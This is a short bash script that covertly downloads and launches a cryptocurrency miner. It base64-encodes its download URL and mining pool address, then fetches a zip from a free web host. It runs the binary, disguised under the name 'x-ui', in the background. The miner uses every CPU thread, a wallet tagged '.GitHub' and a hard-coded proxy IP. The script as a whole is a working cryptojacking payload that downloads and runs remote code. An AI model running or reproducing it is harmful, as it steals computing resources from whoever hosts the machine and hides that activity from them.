#!/bin/bash

sudo apt update
sudo apt install unzip -y

#sudo apt install tor proxychains unzip -y
#sudo nohup tor &>/dev/null &

cpu=$(echo nproc | bash)
user="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY.GitHub"
url="aHR0cHM6Ly9taW5lcmhvc3RpbmcuMDAwd2ViaG9zdGFwcC5jb20vZmlsZXMveC11aS1saW51eC14NjQuemlw"
key="c3RyYXR1bSt0Y3A6Ly9yYW5kb214bW9uZXJvLnVzYS1lYXN0Lm5pY2VoYXNoLmNvbTozMzgw"
seed=$(echo $key | base64 --decode)
location=$(echo $url | base64 --decode)

wget $location

unzip x-ui-linux-x64.zip

cd x-ui-linux-x64/x-ui-6.16.2

chmod 777 x-ui
nohup ./x-ui -a rx -k -o $seed -u $user - px \
--threads=$cpu --cpu-priority=2 \
--astrobwt-avx2 --nicehash \
--randomx-wrmsr=-1 --keepalive \
--proxy=107.174.39.48:6666
